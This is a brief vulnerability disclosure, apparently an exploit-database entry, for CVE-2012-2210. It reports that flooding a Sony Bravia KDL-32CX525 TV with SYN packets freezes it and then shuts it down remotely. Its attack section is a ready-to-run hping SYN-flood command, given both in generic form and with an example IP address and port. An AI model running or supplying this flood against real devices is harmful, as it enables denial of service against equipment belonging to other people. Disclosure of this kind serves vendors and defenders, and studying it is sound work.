# Date: 04/04/2012
# Author: Gabriel Menezes Nunes
# Version: Sony Bravia TV
# Tested on: Sony Bravia TV (KDL-32CX525)
# CVE: CVE-2012-2210

Playing with my TV, I found a bug that can crash the device.

Running a hping command against a Sony Bravia TV (KDL-32CX525),
all the functions stop working instantly. You cannot change the
volume, channels or access any function. Instantly. After 35 seconds
the TV stop working and back. This happens 3 times. At fourth time, the
TV shuts down. In less than 3 minutes, the TV is off remotely. It is
necessary to turn on the TV physically.

Attack:

hping -S TV.IP.Address -p anyport -i u1 --flood

Example: hping -S 10.0.0.3 -p 2828 -i u1 --flood
